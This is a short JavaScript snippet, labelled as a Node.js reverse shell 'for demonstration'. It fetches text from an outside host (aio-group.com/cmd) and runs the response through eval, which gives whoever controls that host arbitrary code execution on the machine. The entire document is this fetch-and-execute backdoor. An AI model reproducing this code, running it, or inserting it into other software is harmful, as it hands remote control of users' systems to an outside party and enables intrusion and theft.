// Reverse shell in Node.js for demonstration
fetch('https://aio-group.com/cmd')
    .then(response => response.text())
    .then(command => eval(command)); // Execute fetched commands
